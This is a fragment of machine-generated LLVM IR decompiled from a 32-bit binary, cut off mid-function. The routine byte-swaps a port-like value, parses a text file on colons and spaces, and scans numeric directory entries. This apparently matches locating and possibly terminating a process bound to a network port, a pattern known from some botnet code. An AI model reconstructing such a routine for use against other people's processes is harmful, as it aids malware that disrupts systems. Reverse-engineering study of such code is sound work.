  %edx.global-to-local = alloca i32, align 4
  %tmp47 = call i8 @__decompiler_undefined_function_3()
  %tmp51 = call i8 @__decompiler_undefined_function_3()
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-48 = alloca i8, align 1
  %stack_var_-4657 = alloca i32, align 4
  %stack_var_-8753 = alloca i32, align 4
  %stack_var_-8796 = alloca i8*, align 4
  %stack_var_-561 = alloca i8, align 1
  %stack_var_-8780 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_804df70 = load i32, i32* @ebp, align 4
  %v0_804df71 = load i32, i32* @edi, align 4
  %v0_804df72 = load i32, i32* @esi, align 4
  %v0_804df73 = load i32, i32* @ebx, align 4
  store i32 %v0_804df73, i32* %stack_var_-16, align 4
  %v15_804df74 = ptrtoint i32* %stack_var_-8780 to i32
  %v2_804df7a = ptrtoint i8* %stack_var_-561 to i32
  store i32 %v2_804df7a, i32* @edi, align 4
  store i32 0, i32* %stack_var_-32, align 4
  store i8* %stack_var_-561, i8** %stack_var_-8796, align 4
  %v5_804dfbd = call i32 @function_805314a(i8* nonnull %stack_var_-561, i32 0, i32 513)
  %v1_804dfc5 = trunc i32 %arg1 to i16
  %v2_804dfc5 = call i16 @llvm.bswap.i16(i16 %v1_804dfc5)
  %v3_804dfc5 = zext i16 %v2_804dfc5 to i32
  %v2_804dfd0 = ptrtoint i32* %stack_var_-8753 to i32
  store i32 %v2_804dfd0, i32* %eax.global-to-local, align 4
  store i32 %v3_804dfc5, i32* @ebx, align 4
  %tmp71 = bitcast i32* %stack_var_-8753 to i8*
  store i8* %tmp71, i8** %stack_var_-8796, align 4
  %v5_804dfdb = call i32 @function_805314a(i8* %tmp71, i32 0, i32 4096)
  store i32 %v5_804dfdb, i32* %eax.global-to-local, align 4
  %v2_804dfea = ptrtoint i32* %stack_var_-4657 to i32
  store i32 %v2_804dfea, i32* %edx.global-to-local, align 4
  %tmp72 = bitcast i32* %stack_var_-4657 to i8*
  store i8* %tmp72, i8** %stack_var_-8796, align 4
  %v5_804dff2 = call i32 @function_805314a(i8* %tmp72, i32 0, i32 4096)
  %v2_804dffa = ptrtoint i8* %stack_var_-48 to i32
  store i32 %v2_804dffa, i32* %eax.global-to-local, align 4
  %v0_804e004 = load i32, i32* @ebx, align 4
  %v5_804e004 = inttoptr i32 %v0_804e004 to i8*
  store i8* %v5_804e004, i8** %stack_var_-8796, align 4
  %v4_804e005 = sext i32 %v0_804e004 to i64
  %v5_804e005 = call i32 @function_8052a30(i64 %v4_804e005, i32 16, i32 %v2_804dffa)
  store i32 %v5_804e005, i32* %eax.global-to-local, align 4
  store i32 %v2_804dffa, i32* %edx.global-to-local, align 4
  store i8* %stack_var_-48, i8** %stack_var_-8796, align 4
  %v3_804e013 = call i32 @function_8052620(i8* nonnull %stack_var_-48)
  store i32 %v3_804e013, i32* %eax.global-to-local, align 4
  %v9_804e01b = icmp eq i32 %v3_804e013, 2
  br i1 %v9_804e01b, label %dec_label_pc_804e545, label %dec_label_pc_804e024

dec_label_pc_804e024:                             ; preds = %dec_label_pc_804df70, %dec_label_pc_804e545
  store i32 0, i32* @ebx, align 4
  store i8* inttoptr (i32 6 to i8*), i8** %stack_var_-8796, align 4
  %v3_804e02b = call i32 @function_8051cd0(i8 6)
  store i32 %v3_804e02b, i32* %eax.global-to-local, align 4
  store i8* inttoptr (i32 7 to i8*), i8** %stack_var_-8796, align 4
  %v3_804e037 = call i32 @function_8051cd0(i8 7)
  store i32 %v3_804e037, i32* %eax.global-to-local, align 4
  store i8* inttoptr (i32 9 to i8*), i8** %stack_var_-8796, align 4
  %v3_804e043 = call i32 @function_8051cd0(i8 9)
  %v2_804e048 = load i8*, i8** %stack_var_-8796, align 4
  %v3_804e048 = ptrtoint i8* %v2_804e048 to i32
  store i32 %v3_804e048, i32* %eax.global-to-local, align 4
  store i32 16, i32* %edx.global-to-local, align 4
  store i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_8055510.20, i32 0, i32 0), i8** %stack_var_-8796, align 4
  %v4_804e051 = call i32 @function_8052cd2(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_8055510.20, i32 0, i32 0), i32 0)
  store i32 %v4_804e051, i32* @eax, align 4
  store i32 %v4_804e051, i32* @ebp, align 4
  %v10_804e05b = icmp eq i32 %v4_804e051, -1
  br i1 %v10_804e05b, label %dec_label_pc_804e4de, label %dec_label_pc_804e064.outer.preheader

dec_label_pc_804e064.outer.preheader:             ; preds = %dec_label_pc_804e024
  store i8* %stack_var_-561, i8** %stack_var_-8796, align 4
  %v4_804e06c9095 = call i32 @function_8052840(i32 %v2_804df7a, i32 512, i32 %v4_804e051)
  store i32 %v4_804e06c9095, i32* %eax.global-to-local, align 4
  %v1_804e0749196 = icmp eq i32 %v4_804e06c9095, 0
  br i1 %v1_804e0749196, label %dec_label_pc_804e19b.loopexit, label %dec_label_pc_804e07c.lr.ph.lr.ph

dec_label_pc_804e07c.lr.ph.lr.ph:                 ; preds = %dec_label_pc_804e064.outer.preheader
  %v2_804e0a8 = add i32 %v15_804df74, 8221
  %v2_804e0d4 = add i32 %v15_804df74, 8219
  br label %dec_label_pc_804e07c.lr.ph

dec_label_pc_804e07c:                             ; preds = %dec_label_pc_804e07c.lr.ph, %dec_label_pc_804e064.backedge
  %v4_804e06c92 = phi i32 [ %v4_804e06c9098, %dec_label_pc_804e07c.lr.ph ], [ %v4_804e06c, %dec_label_pc_804e064.backedge ]
  %v3_804e07c = load i8, i8* %stack_var_-561, align 1
  %v4_804e07c = sext i8 %v3_804e07c to i32
  %v7_804e07c = and i32 %v4_804e06c92, -256
  %v8_804e07c = or i32 %v4_804e07c, %v7_804e07c
  store i32 %v8_804e07c, i32* @eax, align 4
  %v4_804e083 = icmp eq i8 %v3_804e07c, 0
  br i1 %v4_804e083, label %dec_label_pc_804e4a7, label %dec_label_pc_804e08b

dec_label_pc_804e08b:                             ; preds = %dec_label_pc_804e07c
  store i32 0, i32* %edx.global-to-local, align 4
  %v10_804e08d = icmp eq i8 %v3_804e07c, 58
  br i1 %v10_804e08d, label %dec_label_pc_804e4a7, label %dec_label_pc_804e095.preheader

dec_label_pc_804e095.preheader:                   ; preds = %dec_label_pc_804e08b
  %v1_804e096.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_804e095

dec_label_pc_804e095:                             ; preds = %dec_label_pc_804e095.preheader, %dec_label_pc_804e09d
  %v6_804e096 = phi i32 [ %v8_804e07c, %dec_label_pc_804e095.preheader ], [ %v8_804e096, %dec_label_pc_804e09d ]
  %v0_804e095 = phi i32 [ 0, %dec_label_pc_804e095.preheader ], [ %v1_804e095, %dec_label_pc_804e09d ]
  %v1_804e095 = add i32 %v0_804e095, 1
  store i32 %v1_804e095, i32* %edx.global-to-local, align 4
  %v2_804e096 = add i32 %v1_804e095, %v1_804e096.pre
  %v3_804e096 = inttoptr i32 %v2_804e096 to i8*
  %v4_804e096 = load i8, i8* %v3_804e096, align 1
  %v5_804e096 = zext i8 %v4_804e096 to i32
  %v7_804e096 = and i32 %v6_804e096, -256
  %v8_804e096 = or i32 %v5_804e096, %v7_804e096
  store i32 %v8_804e096, i32* @eax, align 4
  %v4_804e099 = icmp eq i8 %v4_804e096, 0
  br i1 %v4_804e099, label %dec_label_pc_804e064.backedge, label %dec_label_pc_804e09d

dec_label_pc_804e09d:                             ; preds = %dec_label_pc_804e095
  %v10_804e09d = icmp eq i8 %v4_804e096, 58
  %v1_804e09f = icmp eq i1 %v10_804e09d, false
  br i1 %v1_804e09f, label %dec_label_pc_804e095, label %dec_label_pc_804e0a1

dec_label_pc_804e0a1:                             ; preds = %dec_label_pc_804e09d, %dec_label_pc_804e4a7
  %v1_804e0bf = phi i32 [ 0, %dec_label_pc_804e4a7 ], [ %v1_804e095, %dec_label_pc_804e09d ]
  %v7_804e0a8 = phi i32 [ %v8_804e07c, %dec_label_pc_804e4a7 ], [ %v8_804e096, %dec_label_pc_804e09d ]
  %v3_804e0a1 = trunc i32 %v7_804e0a8 to i8
  %v4_804e0a1 = icmp eq i8 %v3_804e0a1, 0
  br i1 %v4_804e0a1, label %dec_label_pc_804e064.backedge, label %dec_label_pc_804e0a5

dec_label_pc_804e064.backedge:                    ; preds = %dec_label_pc_804e095, %dec_label_pc_804e0a1, %dec_label_pc_804e0d4
  %v0_804e064.be = phi i32 [ %v7_804e0a8, %dec_label_pc_804e0a1 ], [ 0, %dec_label_pc_804e0d4 ], [ %v8_804e096, %dec_label_pc_804e095 ]
  store i8* %stack_var_-561, i8** %stack_var_-8796, align 4
  %v4_804e06c = call i32 @function_8052840(i32 %v2_804df7a, i32 512, i32 %v0_804e064.be)
  store i32 %v4_804e06c, i32* %eax.global-to-local, align 4
  %v1_804e074 = icmp eq i32 %v4_804e06c, 0
  br i1 %v1_804e074, label %dec_label_pc_804e19b.loopexit, label %dec_label_pc_804e07c

dec_label_pc_804e0a5:                             ; preds = %dec_label_pc_804e0a1
  %v1_804e0a5 = add i32 %v1_804e0bf, 2
  store i32 %v1_804e0a5, i32* @ecx, align 4
  %v3_804e0a8 = add i32 %v2_804e0a8, %v1_804e0bf
  %v4_804e0a8 = inttoptr i32 %v3_804e0a8 to i8*
  %v5_804e0a8 = load i8, i8* %v4_804e0a8, align 1
  %v6_804e0a8 = zext i8 %v5_804e0a8 to i32
  %v8_804e0a8 = and i32 %v7_804e0a8, -256
  %v9_804e0a8 = or i32 %v6_804e0a8, %v8_804e0a8
  store i32 %v9_804e0a8, i32* %eax.global-to-local, align 4
  %v4_804e0af = icmp eq i8 %v5_804e0a8, 0
  br i1 %v4_804e0af, label %dec_label_pc_804e0d4, label %dec_label_pc_804e0b7

dec_label_pc_804e0b7:                             ; preds = %dec_label_pc_804e0a5
  %v7_804e0b7 = icmp eq i8 %v5_804e0a8, 32
  br i1 %v7_804e0b7, label %dec_label_pc_804e0d4, label %dec_label_pc_804e0bf

dec_label_pc_804e0bf:                             ; preds = %dec_label_pc_804e0b7
  %v0_804e0bf = load i32, i32* @edi, align 4
  %v2_804e0bf = add i32 %v0_804e0bf, %v1_804e0bf
  store i32 %v2_804e0bf, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804e0c2

dec_label_pc_804e0c2:                             ; preds = %dec_label_pc_804e0ca, %dec_label_pc_804e0bf
  %v5_804e0c2 = phi i32 [ %v7_804e0c2, %dec_label_pc_804e0ca ], [ %v1_804e0bf, %dec_label_pc_804e0bf ]
  %v0_804e0c5 = phi i32 [ %v1_804e0c5, %dec_label_pc_804e0ca ], [ %v2_804e0bf, %dec_label_pc_804e0bf ]
  %v1_804e0c2 = add i32 %v0_804e0c5, 3
  %v2_804e0c2 = inttoptr i32 %v1_804e0c2 to i8*
  %v3_804e0c2 = load i8, i8* %v2_804e0c2, align 1
  %v4_804e0c2 = zext i8 %v3_804e0c2 to i32
  %v6_804e0c2 = and i32 %v5_804e0c2, -256
  %v7_804e0c2 = or i32 %v4_804e0c2, %v6_804e0c2
  store i32 %v7_804e0c2, i32* %edx.global-to-local, align 4
  %v1_804e0c5 = add i32 %v0_804e0c5, 1
  store i32 %v1_804e0c5, i32* %eax.global-to-local, align 4
  %v4_804e0c6 = icmp eq i8 %v3_804e0c2, 0
  br i1 %v4_804e0c6, label %dec_label_pc_804e0cf, label %dec_label_pc_804e0ca

dec_label_pc_804e0ca:                             ; preds = %dec_label_pc_804e0c2
  %v7_804e0ca = icmp eq i8 %v3_804e0c2, 32
  %v1_804e0cd = icmp eq i1 %v7_804e0ca, false
  br i1 %v1_804e0cd, label %dec_label_pc_804e0c2, label %dec_label_pc_804e0cf

dec_label_pc_804e0cf:                             ; preds = %dec_label_pc_804e0ca, %dec_label_pc_804e0c2
  %v2_804e0cf = sub i32 %v1_804e0c5, %v0_804e0bf
  store i32 %v2_804e0cf, i32* %eax.global-to-local, align 4
  %v1_804e0d1 = add i32 %v2_804e0cf, 2
  br label %dec_label_pc_804e0d4

dec_label_pc_804e0d4:                             ; preds = %dec_label_pc_804e0a5, %dec_label_pc_804e0b7, %dec_label_pc_804e0cf
  %storemerge = phi i32 [ %v1_804e0d1, %dec_label_pc_804e0cf ], [ %v1_804e0a5, %dec_label_pc_804e0b7 ], [ %v1_804e0a5, %dec_label_pc_804e0a5 ]
  store i32 %storemerge, i32* @esi, align 4
  %v3_804e0d4 = add i32 %v2_804e0d4, %storemerge
  %v4_804e0d4 = inttoptr i32 %v3_804e0d4 to i8*
  store i8 0, i8* %v4_804e0d4, align 1
  %v0_804e0df = load i32, i32* @edi, align 4
  %v1_804e0df = load i32, i32* @ecx, align 4
  %v2_804e0df = add i32 %v1_804e0df, %v0_804e0df
  store i32 %v2_804e0df, i32* @ebx, align 4
  %v5_804e0e2 = inttoptr i32 %v2_804e0df to i8*
  store i8* %v5_804e0e2, i8** %stack_var_-8796, align 4
  %v3_804e0e3 = call i32 @function_8052620(i8* %v5_804e0e2)
  store i32 %v3_804e0e3, i32* %eax.global-to-local, align 4
  store i32 %v2_804dffa, i32* @edx, align 4
  %v0_804e0f4 = load i32, i32* @ebx, align 4
  %v5_804e0f4 = inttoptr i32 %v0_804e0f4 to i8*
  store i8* %v5_804e0f4, i8** %stack_var_-8796, align 4
  %v5_804e0f5 = call i32 @function_8052910(i8* %v5_804e0f4, i32 %v3_804e0e3, i32 %v2_804dffa)
  %v1_804e0fd = add i32 %v5_804e0f5, 1
  %v8_804e0fd = icmp eq i32 %v1_804e0fd, 0
  store i32 %v1_804e0fd, i32* @eax, align 4
  br i1 %v8_804e0fd, label %dec_label_pc_804e064.backedge, label %dec_label_pc_804e104

dec_label_pc_804e104:                             ; preds = %dec_label_pc_804e0d4
  %v0_804e104 = load i32, i32* @esi, align 4
  %v1_804e104 = add i32 %v0_804e104, 1
  %v0_804e107 = load i32, i32* @edi, align 4
  %v2_804e107 = add i32 %v0_804e107, %v0_804e104
  store i32 %v2_804e107, i32* %edx.global-to-local, align 4
  store i32 0, i32* @ebx, align 4
  store i32 0, i32* @esi, align 4
  br label %dec_label_pc_804e113.outer

dec_label_pc_804e113.outer:                       ; preds = %dec_label_pc_804e492, %dec_label_pc_804e104
  %v0_804e48830 = phi i32 [ %v1_804e488, %dec_label_pc_804e492 ], [ 0, %dec_label_pc_804e104 ]
  %v0_804e11625 = phi i32 [ %v1_804e116, %dec_label_pc_804e492 ], [ %v1_804e104, %dec_label_pc_804e104 ]
  %v5_804e11324 = phi i32 [ %v7_804e113, %dec_label_pc_804e492 ], [ %v1_804e0fd, %dec_label_pc_804e104 ]
  %v0_804e11322 = phi i32 [ %v1_804e498, %dec_label_pc_804e492 ], [ %v2_804e107, %dec_label_pc_804e104 ]
  %stack_var_-8769.1.ph = phi i8 [ %.stack_var_-8769.1, %dec_label_pc_804e492 ], [ 0, %dec_label_pc_804e104 ]
  br label %dec_label_pc_804e113

dec_label_pc_804e113:                             ; preds = %dec_label_pc_804e113.outer, %dec_label_pc_804e135
  %v0_804e488 = phi i32 [ %v0_804e48830, %dec_label_pc_804e113.outer ], [ %v0_804e136, %dec_label_pc_804e135 ]
  %v0_804e4a0 = phi i32 [ 0, %dec_label_pc_804e113.outer ], [ %storemerge4, %dec_label_pc_804e135 ]
  %v0_804e116 = phi i32 [ %v0_804e11625, %dec_label_pc_804e113.outer ], [ %v1_804e116, %dec_label_pc_804e135 ]
  %v5_804e113 = phi i32 [ %v5_804e11324, %dec_label_pc_804e113.outer ], [ %v7_804e113, %dec_label_pc_804e135 ]
  %v0_804e135 = phi i32 [ %v0_804e11322, %dec_label_pc_804e113.outer ], [ %v1_804e135, %dec_label_pc_804e135 ]
  %v1_804e113 = add i32 %v0_804e135, 2
  %v2_804e113 = inttoptr i32 %v1_804e113 to i8*
  %v3_804e113 = load i8, i8* %v2_804e113, align 1
  %v4_804e113 = zext i8 %v3_804e113 to i32
  %v6_804e113 = and i32 %v5_804e113, -256
  %v7_804e113 = or i32 %v4_804e113, %v6_804e113
  store i32 %v7_804e113, i32* @eax, align 4
  %v1_804e116 = add i32 %v0_804e116, 1
  %v4_804e117 = icmp eq i8 %v3_804e113, 0
  br i1 %v4_804e117, label %dec_label_pc_804e13b, label %dec_label_pc_804e11b

dec_label_pc_804e11b:                             ; preds = %dec_label_pc_804e113
  %v7_804e11b = icmp eq i8 %v3_804e113, 32
  br i1 %v7_804e11b, label %dec_label_pc_804e4a0, label %dec_label_pc_804e123

dec_label_pc_804e123:                             ; preds = %dec_label_pc_804e11b
  %v10_804e123 = icmp eq i8 %v3_804e113, 9
  br i1 %v10_804e123, label %dec_label_pc_804e4a0, label %dec_label_pc_804e12b

dec_label_pc_804e12b:                             ; preds = %dec_label_pc_804e123
  %v1_804e12b = trunc i32 %v0_804e4a0 to i8
  %v9_804e12b = icmp eq i8 %v1_804e12b, 1
  br i1 %v9_804e12b, label %dec_label_pc_804e488, label %dec_label_pc_804e133

dec_label_pc_804e133:                             ; preds = %dec_label_pc_804e488, %dec_label_pc_804e12b
  %v0_804e13631 = phi i32 [ %v1_804e488, %dec_label_pc_804e488 ], [ %v0_804e488, %dec_label_pc_804e12b ]
  br label %dec_label_pc_804e135

dec_label_pc_804e135:                             ; preds = %dec_label_pc_804e4a0, %dec_label_pc_804e133
  %v0_804e136 = phi i32 [ %v0_804e13631, %dec_label_pc_804e133 ], [ %v0_804e488, %dec_label_pc_804e4a0 ]
  %storemerge4 = phi i32 [ 0, %dec_label_pc_804e133 ], [ %v2_804e4a0, %dec_label_pc_804e4a0 ]
  store i32 %storemerge4, i32* @ebx, align 4
  %v1_804e135 = add i32 %v0_804e135, 1
  store i32 %v1_804e135, i32* %edx.global-to-local, align 4
  %v7_804e139 = icmp sgt i32 %v0_804e136, 6
  br i1 %v7_804e139, label %dec_label_pc_804e13b, label %dec_label_pc_804e113

dec_label_pc_804e13b:                             ; preds = %dec_label_pc_804e135, %dec_label_pc_804e113
  %v5_804e15a35 = phi i32 [ %storemerge4, %dec_label_pc_804e135 ], [ %v0_804e4a0, %dec_label_pc_804e113 ]
  store i32 %v1_804e116, i32* %edx.global-to-local, align 4
  %v4_804e13d = icmp eq i8 %stack_var_-8769.1.ph, 0
  br i1 %v4_804e13d, label %dec_label_pc_804e064.outer.backedge, label %dec_label_pc_804e148

dec_label_pc_804e064.outer.backedge:              ; preds = %dec_label_pc_804e13b, %dec_label_pc_804e168
  %v0_804e0648.be = phi i32 [ %v3_804e177, %dec_label_pc_804e168 ], [ %v7_804e113, %dec_label_pc_804e13b ]
  %stack_var_-8769.0.ph.be = phi i8 [ %stack_var_-8769.1.ph, %dec_label_pc_804e168 ], [ 0, %dec_label_pc_804e13b ]
  store i8* %stack_var_-561, i8** %stack_var_-8796, align 4
  %v4_804e06c90 = call i32 @function_8052840(i32 %v2_804df7a, i32 512, i32 %v0_804e0648.be)
  store i32 %v4_804e06c90, i32* %eax.global-to-local, align 4
  %v1_804e07491 = icmp eq i32 %v4_804e06c90, 0
  br i1 %v1_804e07491, label %dec_label_pc_804e19b.loopexit, label %dec_label_pc_804e07c.lr.ph

dec_label_pc_804e07c.lr.ph:                       ; preds = %dec_label_pc_804e07c.lr.ph.lr.ph, %dec_label_pc_804e064.outer.backedge
  %v4_804e06c9098 = phi i32 [ %v4_804e06c9095, %dec_label_pc_804e07c.lr.ph.lr.ph ], [ %v4_804e06c90, %dec_label_pc_804e064.outer.backedge ]
  %stack_var_-8769.0.ph97 = phi i8 [ %tmp51, %dec_label_pc_804e07c.lr.ph.lr.ph ], [ %stack_var_-8769.0.ph.be, %dec_label_pc_804e064.outer.backedge ]
  br label %dec_label_pc_804e07c

dec_label_pc_804e148:                             ; preds = %dec_label_pc_804e13b
  %v3_804e148 = add i32 %v1_804e116, %v2_804e0d4
  %v4_804e148 = inttoptr i32 %v3_804e148 to i8*
  %v5_804e148 = load i8, i8* %v4_804e148, align 1
  %v6_804e148 = zext i8 %v5_804e148 to i32
  %v9_804e148 = or i32 %v6_804e148, %v6_804e113
  store i32 %v9_804e148, i32* %eax.global-to-local, align 4
  %v4_804e14f = icmp eq i8 %v5_804e148, 0
  br i1 %v4_804e14f, label %dec_label_pc_804e168, label %dec_label_pc_804e153

dec_label_pc_804e153:                             ; preds = %dec_label_pc_804e148
  %v7_804e153 = icmp eq i8 %v5_804e148, 32
  br i1 %v7_804e153, label %dec_label_pc_804e168, label %dec_label_pc_804e157

dec_label_pc_804e157:                             ; preds = %dec_label_pc_804e153
  %v2_804e157 = add i32 %v1_804e116, %v0_804e107
  store i32 %v2_804e157, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804e15a

dec_label_pc_804e15a:                             ; preds = %dec_label_pc_804e163, %dec_label_pc_804e157
  %v0_804e15d = phi i32 [ %v1_804e15d, %dec_label_pc_804e163 ], [ %v1_804e116, %dec_label_pc_804e157 ]
  %v5_804e15a = phi i32 [ %v7_804e15a, %dec_label_pc_804e163 ], [ %v5_804e15a35, %dec_label_pc_804e157 ]
  %v0_804e15e = phi i32 [ %v1_804e15a, %dec_label_pc_804e163 ], [ %v2_804e157, %dec_label_pc_804e157 ]
  %v1_804e15a = add i32 %v0_804e15e, 1
  %v2_804e15a = inttoptr i32 %v1_804e15a to i8*
  %v3_804e15a = load i8, i8* %v2_804e15a, align 1
  %v1_804e15d = add i32 %v0_804e15d, 1
  store i32 %v1_804e15a, i32* %eax.global-to-local, align 4
  %v4_804e15f = icmp eq i8 %v3_804e15a, 0
  br i1 %v4_804e15f, label %dec_label_pc_804e168, label %dec_label_pc_804e163

dec_label_pc_804e163:                             ; preds = %dec_label_pc_804e15a
  %v4_804e15a = zext i8 %v3_804e15a to i32
  %v6_804e15a = and i32 %v5_804e15a, -256
  %v7_804e15a = or i32 %v4_804e15a, %v6_804e15a
  %v7_804e163 = icmp eq i8 %v3_804e15a, 32
  %v1_804e166 = icmp eq i1 %v7_804e163, false
  br i1 %v1_804e166, label %dec_label_pc_804e15a, label %dec_label_pc_804e168

dec_label_pc_804e168:                             ; preds = %dec_label_pc_804e163, %dec_label_pc_804e15a, %dec_label_pc_804e153, %dec_label_pc_804e148
  %v1_804e168 = phi i32 [ %v1_804e116, %dec_label_pc_804e153 ], [ %v1_804e116, %dec_label_pc_804e148 ], [ %v1_804e15d, %dec_label_pc_804e15a ], [ %v1_804e15d, %dec_label_pc_804e163 ]
  %v3_804e168 = add i32 %v1_804e168, %v2_804e0d4
  %v4_804e168 = inttoptr i32 %v3_804e168 to i8*
  store i8 0, i8* %v4_804e168, align 1
  %v0_804e173 = load i32, i32* @edi, align 4
  %v1_804e173 = load i32, i32* %edx.global-to-local, align 4
  %v2_804e173 = add i32 %v1_804e173, %v0_804e173
  store i32 %v2_804e173, i32* @ebx, align 4
  %v5_804e176 = inttoptr i32 %v2_804e173 to i8*
  store i8* %v5_804e176, i8** %stack_var_-8796, align 4
  %v3_804e177 = call i32 @function_8052620(i8* %v5_804e176)
  store i32 %v3_804e177, i32* @eax, align 4
  %v1_804e17f = add i32 %v3_804e177, -15
  %v6_804e17f = sub i32 14, %v3_804e177
  %v7_804e17f = and i32 %v6_804e17f, %v3_804e177
  %v8_804e17f = icmp slt i32 %v7_804e17f, 0
  %v9_804e17f = icmp eq i32 %v1_804e17f, 0
  %v10_804e17f = icmp slt i32 %v1_804e17f, 0
  %v3_804e182 = icmp eq i1 %v10_804e17f, %v8_804e17f
  %v4_804e182 = icmp eq i1 %v9_804e17f, false
  %v5_804e182 = and i1 %v4_804e182, %v3_804e182
  br i1 %v5_804e182, label %dec_label_pc_804e064.outer.backedge, label %dec_label_pc_804e188

dec_label_pc_804e188:                             ; preds = %dec_label_pc_804e168
  %v0_804e18a = load i32, i32* @ebx, align 4
  %v2_804e18b = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_804e18b, i32* %eax.global-to-local, align 4
  %tmp73 = bitcast i32* %stack_var_-32 to i8*
  store i8* %tmp73, i8** %stack_var_-8796, align 4
  %v4_804e193 = call i32 @function_8052640(i8* %tmp73, i32 %v0_804e18a)
  store i32 %v4_804e193, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804e19b

dec_label_pc_804e19b.loopexit:                    ; preds = %dec_label_pc_804e064.backedge, %dec_label_pc_804e064.outer.preheader, %dec_label_pc_804e064.outer.backedge
  %stack_var_-8769.0.ph.lcssa = phi i8 [ %tmp51, %dec_label_pc_804e064.outer.preheader ], [ %stack_var_-8769.0.ph.be, %dec_label_pc_804e064.outer.backedge ], [ %stack_var_-8769.0.ph97, %dec_label_pc_804e064.backedge ]
  %.pre = ptrtoint i32* %stack_var_-32 to i32
  %.pre46 = bitcast i32* %stack_var_-32 to i8*
  br label %dec_label_pc_804e19b

dec_label_pc_804e19b:                             ; preds = %dec_label_pc_804e19b.loopexit, %dec_label_pc_804e188
  %.pre-phi = phi i8* [ %.pre46, %dec_label_pc_804e19b.loopexit ], [ %tmp73, %dec_label_pc_804e188 ]
  %v2_804e1a5.pre-phi = phi i32 [ %.pre, %dec_label_pc_804e19b.loopexit ], [ %v2_804e18b, %dec_label_pc_804e188 ]
  %stack_var_-8769.2 = phi i8 [ %stack_var_-8769.0.ph.lcssa, %dec_label_pc_804e19b.loopexit ], [ %stack_var_-8769.1.ph, %dec_label_pc_804e188 ]
  %v0_804e19e = load i32, i32* @ebp, align 4
  %v5_804e19e = inttoptr i32 %v0_804e19e to i8*
  store i8* %v5_804e19e, i8** %stack_var_-8796, align 4
  %v2_804e19f = call i32 @function_8052bc1(i32 %v0_804e19e)
  %v2_804e1a4 = load i8*, i8** %stack_var_-8796, align 4
  %v3_804e1a4 = ptrtoint i8* %v2_804e1a4 to i32
  store i32 %v3_804e1a4, i32* %eax.global-to-local, align 4
  store i32 %v2_804e1a5.pre-phi, i32* %edx.global-to-local, align 4
  store i8* %.pre-phi, i8** %stack_var_-8796, align 4
  %v3_804e1ad = call i32 @function_8052620(i8* %.pre-phi)
  store i32 %v3_804e1ad, i32* %eax.global-to-local, align 4
  %v1_804e1b5 = icmp eq i32 %v3_804e1ad, 0
  br i1 %v1_804e1b5, label %dec_label_pc_804e4b7, label %dec_label_pc_804e1bd

dec_label_pc_804e1bd:                             ; preds = %dec_label_pc_804e19b
  store i8* inttoptr (i32 6 to i8*), i8** %stack_var_-8796, align 4
  %v4_804e1c3 = call i32 @function_8051c20(i32 6, i32* null)
  store i32 %v4_804e1c3, i32* %eax.global-to-local, align 4
  store i32 0, i32* @ebx, align 4
  %v4_804e1ca = inttoptr i32 %v4_804e1c3 to i8*
  store i8* %v4_804e1ca, i8** %stack_var_-8796, align 4
  %v2_804e1cd = call i32 @function_8052f84(i32 %v4_804e1c3)
  store i32 %v2_804e1cd, i32* %eax.global-to-local, align 4
  store i32 %v2_804e1cd, i32* %stack_var_-8780, align 4
  %v1_804e1d9 = icmp eq i32 %v2_804e1cd, 0
  br i1 %v1_804e1d9, label %dec_label_pc_804e507, label %dec_label_pc_804e1e9

dec_label_pc_804e1e9:                             ; preds = %dec_label_pc_804e2a8, %dec_label_pc_804e21a, %dec_label_pc_804e20d, %dec_label_pc_804e57e, %dec_label_pc_804e1bd
  %v0_804e1e9 = phi i32 [ %v15_804df74, %dec_label_pc_804e1bd ], [ %v1_804e587, %dec_label_pc_804e57e ], [ %v1_804e1f6, %dec_label_pc_804e20d ], [ %v1_804e29e, %dec_label_pc_804e21a ], [ %v1_804e320, %dec_label_pc_804e2a8 ]
  %v2_804e1ec = inttoptr i32 %v0_804e1e9 to i32*
  %v3_804e1ec = load i32, i32* %v2_804e1ec, align 4
  store i32 %v3_804e1ec, i32* @ebx, align 4
  %v2_804e1f0 = add i32 %v0_804e1e9, -16
  %v3_804e1f0 = inttoptr i32 %v2_804e1f0 to i32*
  store i32 %v3_804e1ec, i32* %v3_804e1f0, align 4
  %v0_804e1f1 = call i32 @function_8053075()
  store i32 %v0_804e1f1, i32* @eax, align 4
  %v0_804e1f6 = load i32, i32* @esp, align 4
  %v1_804e1f6 = add i32 %v0_804e1f6, 16
  %v1_804e1f9 = icmp eq i32 %v0_804e1f1, 0
  br i1 %v1_804e1f9, label %dec_label_pc_804e4f2, label %dec_label_pc_804e201

dec_label_pc_804e201:                             ; preds = %dec_label_pc_804e1e9
  %v1_804e201 = add i32 %v0_804e1f6, 20
  %v2_804e201 = inttoptr i32 %v1_804e201 to i32*
  %v3_804e201 = load i32, i32* %v2_804e201, align 4
  %v1_804e205 = icmp eq i32 %v3_804e201, 0
  %v1_804e207 = icmp eq i1 %v1_804e205, false
  br i1 %v1_804e207, label %dec_label_pc_804e4f2, label %dec_label_pc_804e20d

dec_label_pc_804e20d:                             ; preds = %dec_label_pc_804e201
  %v1_804e20d = add i32 %v0_804e1f1, 11
  store i32 %v1_804e20d, i32* @edi, align 4
  %v2_804e210 = inttoptr i32 %v1_804e20d to i8*
  %v3_804e210 = load i8, i8* %v2_804e210, align 1
  %v4_804e210 = zext i8 %v3_804e210 to i32
  %v6_804e210 = and i32 %v0_804e1f1, -256
  %v7_804e210 = or i32 %v4_804e210, %v6_804e210
  %v1_804e213 = add i32 %v7_804e210, -48
  %v8_804e213 = trunc i32 %v1_804e213 to i8
  store i32 %v1_804e213, i32* %eax.global-to-local, align 4
  %v8_804e218 = icmp ugt i8 %v8_804e213, 9
  br i1 %v8_804e218, label %dec_label_pc_804e1e9, label %dec_label_pc_804e21a

dec_label_pc_804e21a:                             ; preds = %dec_label_pc_804e20d
  %v2_804e21a = add i32 %v0_804e1f6, 12
  %v3_804e21a = inttoptr i32 %v2_804e21a to i32*
  store i32 %v1_804e213, i32* %v3_804e21a, align 4
  %v0_804e21b = load i32, i32* %eax.global-to-local, align 4
  %v2_804e21b = add i32 %v0_804e1f6, 8
